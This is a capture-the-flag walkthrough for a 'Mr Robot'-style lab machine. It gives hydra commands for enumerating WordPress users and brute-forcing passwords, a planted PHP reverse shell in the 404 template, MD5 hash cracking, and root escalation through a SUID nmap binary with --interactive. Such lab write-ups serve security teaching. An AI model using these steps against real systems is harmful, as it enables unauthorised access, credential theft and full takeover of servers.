# Getting the first key

Look through the robots.txt file to get the location to the first key and the fsocity.dic wordlist, download with
```
wget http://machine_ip/fsocity.dic -O fsocity.dic
```


# Initial foothold

After a little directory fuzzing we should find a /dashboard which redirects to /wp-admin.

After a failed login attempt, the login page returns a verbose error message
```
invalid username
```
with this, we can enumerate for valid users using hydra
```
hydra -L fsocity.dic -p passwd <Target IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:invalid username" -t 64
```
This should return the username "Elliot" as a valid user.

Now, with a valid user, and the fsocity.dic wordlist, we use that to obtain Elliot's password with hydra as;
```
hydra -l Elliot -P fsocity.dic <Target IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 64
```
Password obtained "ER28-0652".

The user Elliot has editor privileges on the word press site, so we use this to edit the 404 template, replacing its content with a php revershell from pentestmonkey.
```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```
Change the necessary parameters(IP and port).

Start up a listener and trigger a "not found" or 404 on the page.


# Getting key 2

with the shell obtained, read the content of "/home/robot/password.raw-md5" and crack robot's password with crackstation or use john

Su as robot and get the key at '/home/robot/key-2-of-3.txt'

# Gaining root + key 3

Running
```
find / -perm -04000 -type f -ls 2>/dev/null
```
we find
```
4430     20 -rwsr-xr-x   1 root     root        17272 Jun  2  2025 /usr/local/bin/nmap
```
Nmap with root level access.

Abuse nmap with
```
nmap --interactive
```
this should start up an interactive interface within nmap running as root, key 3 at /root/key-3-of-3.txt


